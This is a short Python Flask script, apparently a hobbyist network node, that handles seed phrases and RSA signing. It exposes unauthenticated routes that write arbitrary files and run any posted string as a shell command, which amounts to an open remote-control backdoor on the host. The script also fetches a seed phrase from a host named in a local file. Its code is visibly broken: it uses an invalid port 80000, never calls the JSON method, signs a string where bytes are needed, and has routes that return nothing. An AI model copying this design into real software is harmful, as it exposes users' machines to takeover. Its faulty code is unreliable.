from flask import Flask, request
import socket
app = Flask(__name__)
seedphrase = ""
import subprocess
import requests
import hashlib
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from ecdsa import SigningKey,VerifyingKey
from ecdsa.curves import SECP256k1
def get_local_ip():
    # Get the local IP address of the computer
    return socket.gethostbyname(socket.gethostname()) 

@app.route("/addfile", methods=['POST'])
def addfile():
    data = request.get_json()
    filename = data["filename"]
    filedata = data["filedata"]
    with open(filename, "w") as file:
        file.write(filedata)
@app.route("/executecommand",methods=['POST'])
def executecommand():
    data = request.get_json()
    command = data["Command"]
    output = subprocess.check_output(command, shell=True, text=True)

# Print the output
    print(output)
@app.route("/getinternetspeed",methods=['GET'])
def getinternetspeed():
    truethingything = True
    filepowerdata = ""
    try:
        with open("internetspeed.txt") as file:
            filepowerdata = file.read()
    except:
        print("ERROR")
        truethingything = False
    if truethingything == True:
        return {"Success":filepowerdata}
trueproof = True
filedata = ""
try:
    with open("IP.txt","r") as file:
        filedata = file.read()
except:
    trueproof = False
if trueproof == True:
    URLY = filedata+":80000/gettheselfkey"
    responsy = requests.get(URLY)
    if responsy.status_code == 200:
        data = responsy.json
        seedphrase = data
seed_phrase = seedphrase

# Derive a cryptographic key from the seed phrase
seed_key = hashlib.sha256(seed_phrase.encode()).digest()

# Generate a private key
private_key3333 = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,  # Adjust the key size as needed
)

# Serialize the private key
private_pem = private_key3333.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption(),
)

# Generate a corresponding public key
public_key3333333 = private_key3333.public_key()

# Serialize the public key
public_pem = public_key3333333.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo,
)
localipstring = str(get_local_ip())
message = localipstring
signature = private_key3333.sign(
    message,
    padding.PSS(
        mgf=padding.MGF1(hashes.SHA256()),
        salt_length=padding.PSS.MAX_LENGTH
    ),
    hashes.SHA256()
)
data = {"seedphrase":seed_phrase,"verifyingsig":signature,"IPAddress":localipstring}
if __name__ == "__main__":
    local_ip = get_local_ip()
    app.run(host=local_ip, port=8002)

